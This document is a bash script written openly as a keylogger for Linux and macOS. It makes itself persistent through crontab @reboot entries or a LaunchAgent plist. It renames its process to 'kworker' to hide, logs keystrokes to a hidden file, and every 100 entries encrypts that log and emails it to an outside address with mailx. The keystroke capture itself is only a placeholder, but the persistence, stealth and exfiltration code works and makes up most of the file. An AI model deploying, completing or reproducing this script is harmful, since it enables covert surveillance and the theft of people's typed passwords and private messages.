#!/bin/bash

# Log file where captured keystrokes will be saved
LOG_FILE="$HOME/.keys.log"

# Set the process name to something that looks like a system process (for stealth)
PROCESS_NAME="kworker"

# Initialize keylogger count and the threshold at which the log will be sent via email
KEYLOG_COUNT=0
EMAIL_LOG_THRESHOLD=100

# Encryption password for securing logs before sending via email
ENCRYPTION_PASS="your_secure_password"

# ---- OS Detection and Persistence ----
# Function to detect the operating system (Linux or macOS)
detect_os() {
  if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS="Linux"  # Linux detected
  elif [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macOS"  # macOS detected
  else
    echo "Unsupported OS"  # Script exits if the OS is unsupported
    exit 1
  fi
}

# ---- Linux Persistence ----
# Function to make the script persistent across reboots on Linux using crontab
make_persistent_linux() {
  # Check if script is already in crontab to avoid duplication
  if ! (crontab -l | grep "$(realpath "$0")" > /dev/null 2>&1); then
    # If not in crontab, add it with the @reboot directive so it runs after a reboot
    (crontab -l 2>/dev/null; echo "@reboot $(realpath "$0") &") | crontab -
  fi
}

# ---- macOS Persistence ----
# Function to make the script persistent across reboots on macOS using launchctl
make_persistent_macos() {
  PLIST="$HOME/Library/LaunchAgents/com.keylogger.plist"  # Path to plist file
  if [[ ! -f "$PLIST" ]]; then  # Only create the plist file if it doesn't already exist
    # Create a launchctl plist file to ensure the script runs at login or reboot
    cat <<EOF > "$PLIST"
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
      <dict>
        <key>Label</key>
        <string>com.keylogger</string>  # Unique identifier for the keylogger
        <key>ProgramArguments</key>
        <array>
          <string>$(realpath "$0")</string>  # Ensure the current script path is stored
        </array>
        <key>RunAtLoad</key>
        <true/>  # Runs the script when the user logs in or system starts
        <key>KeepAlive</key>
        <true/>  # Ensures the script keeps running if it stops
      </dict>
    </plist>
EOF
    # Load the plist so that the script is executed as soon as the system starts
    launchctl load "$PLIST"
  fi
}

# ---- Main Script Execution ----
# Step 1: Detect the operating system and set up persistence
detect_os
if [[ "$OS" == "Linux" ]]; then
  make_persistent_linux  # Linux-specific persistence setup
elif [[ "$OS" == "macOS" ]]; then
  make_persistent_macos  # macOS-specific persistence setup
fi

# Step 2: Setup a fake process name to make the script less noticeable
# Change the name of the running process (not all systems support this)
echo "$PROCESS_NAME" > /proc/$$/comm 2>/dev/null || true

# Step 3: Start keylogger functionality
# --- Start Monitoring Keyboard Activity (you will need a method like xinput on Linux or IOKit on macOS)

# Example of collecting input (actual keylogging code should go here)
# In Linux, you can use tools like `xinput` or `evdev` to capture keystrokes

while true; do
  # Capturing keystrokes (This is a placeholder. Replace with real keylogging technique)
  echo "CapturedKeyStroke" >> "$LOG_FILE"  # Log every captured keystroke
  ((KEYLOG_COUNT++))  # Increment keystroke counter

  # Step 4: Send email if the number of keystrokes reaches the threshold
  if [[ "$KEYLOG_COUNT" -ge "$EMAIL_LOG_THRESHOLD" ]]; then
    # Encrypt log (optional step)
    openssl enc -aes-256-cbc -salt -in "$LOG_FILE" -out "$LOG_FILE.enc" -k "$ENCRYPTION_PASS"
    
    # Send the log via email (Using mailx or another tool. Replace "recipient@example.com" with a valid email)
    mailx -s "Keylog Report" -A "$LOG_FILE.enc" recipient@example.com <<< "Keylog attached"

    # Clear the log after sending
    > "$LOG_FILE"
    KEYLOG_COUNT=0
  fi

  # Step 5: Check network connectivity before sending emails (Example: ping Google's DNS)
  if ping -c 1 8.8.8.8 &> /dev/null; then
    echo "Network is up"
  else
    echo "Network is down"
  fi

  # Small delay before capturing next keystroke
  sleep 1
done
